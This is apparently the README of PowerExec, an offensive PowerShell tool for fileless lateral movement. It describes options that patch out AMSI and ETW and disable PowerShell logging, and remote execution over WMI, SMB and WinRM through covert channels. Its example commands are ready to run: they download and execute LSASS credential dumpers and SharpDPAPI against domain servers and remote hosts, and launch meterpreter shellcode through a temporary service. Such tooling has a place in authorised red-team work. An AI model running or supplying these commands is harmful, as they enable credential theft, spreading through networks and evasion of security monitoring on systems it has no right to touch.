# PowerExec

PowerExec combines various bypass techniques and execution methods for fileless lateral movement.


## Functions

```
New-PowerLoader                 -   builds PowerShell script block for in-memory execution of various payload types
Invoke-PowerExec                -   runs PowerShell script block on remote computers through various execution methods
```


## Payload types

The payload type must be specified within the function `New-PowerLoader`:

| Type      | Description                |
| --------- | -------------------------- |
| PoSh      | PowerShell script          |
| NetAsm    | .NET assembly executable   |
| PE        | Windows PE file (EXE/DLL)  |
| Shellcode | Shellcode in binary format |

Resulting PowerShell script block is built either from a local payload file or from a remote payload using a download cradle.

Please note that PE and shellcode execution output will only be retrieved when run locally, not remotely.


## Bypass techniques

Bypass techniques can be specified within the function `New-PowerLoader`:

| Bypass | Description                                              |
| ------ | -------------------------------------------------------- |
| AMSI   | Bypass Antimalware Scan Interface via in-memory patching |
| ETW    | Bypass Event Tracing for Windows via in-memory patching  |
| SBL    | Disable PowerShell Script Block Logging                  |
| PML    | Disable PowerShell Module Logging                        |
| PRM    | Disable PowerShell Readline Module                       |


## Execution methods

The execution method must be specified within the function `Invoke-PowerExec`:

| Method          | Description                                            | Covert channel               | Run as       |
| --------------- | ------------------------------------------------------ | ---------------------------- | ------------ |
| CimProcess      | Create process via WMI                                 | WMI property 'DebugFilePath' | Current user |
| CimService      | Create temporary service via WMI                       | WMI property 'DebugFilePath' | SYSTEM       |
| CimSubscription | Create temporary WMI event subscription (experimental) | WMI property 'DebugFilePath' | SYSTEM       |
| CimTask         | Create temporary scheduled task via WMI                | WMI property 'DebugFilePath' | SYSTEM       |
| SmbDcom         | Create DCOM instance via DCE/RPC                       | SMB named pipe               | Current user |
| SmbService      | Create temporary service via DCE/RPC                   | SMB named pipe               | SYSTEM       |
| SmbTask         | Create temporary scheduled task via DCE/RPC            | SMB named pipe               | SYSTEM       |
| WinRM           | Run powershell via Windows Remote Management           | PowerShell Remoting          | Current user |

Depending on the method used, a covert channel is established in order to deliver the payload and to retrieve execution output.

Please note that multi-threading is supported for WinRM method only.
For WMI/CIM methods, the transport protocol can be chosen between DCOM and WSMAN.


## Examples

Run a remote PE locally while bypassing PowerShell Module Logging and Script Block Logging and AMSI:

```
PS C:\> & (New-PowerLoader -Type PE -FileUrl 'https://raw.githubusercontent.com/fortra/nanodump/main/dist/nanodump_ssp.x64.exe' -ArgumentList '-w','C:\Windows\Temp\lsass.dmp' -Bypass PML,SBL,AMSI)
```

Run a PowerShell script on domain servers through WinRM while bypassing ETW and AMSI:

```
PS C:\> $payload = New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/tmenochet/PowerDump/master/LsassDump.ps1' -ArgumentList 'Invoke-LsassDump' -Bypass ETW,AMSI
PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method WinRM -ComputerDomain ADATUM.CORP -ComputerFilter Servers -Threads 20
```

Run a .NET assembly on remote hosts through WMI while bypassing ETW and AMSI:

```
PS C:\> $payload = New-PowerLoader -Type NetAsm -FileUrl 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/SharpDPAPI.exe' -ArgumentList 'machinecredentials' -Bypass ETW,AMSI
PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method CimProcess -Protocol Dcom -Authentication Default -ComputerList 192.168.1.1,192.168.1.2
```

Run a raw shellcode by creating a new process on a remote host through a temporary service:

```
PS C:\> New-PowerLoader -Type Shellcode -FilePath .\meterpreter.bin -SpawnProcess notepad.exe | Invoke-PowerExec -Method SmbService -ComputerList 192.168.1.1
```


## Acknowledgments

PowerLoader is inspired by the following researches:

  * https://rastamouse.me/blog/asb-bypass-pt3/
  * https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
  * https://www.bc-security.org/post/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/
  * https://blog.xpnsec.com/hiding-your-dotnet-etw

PowerExec is inspired by the following researches:

  * https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html
  * https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/
  * https://blog.harmj0y.net/empire/expanding-your-empire/
  * https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
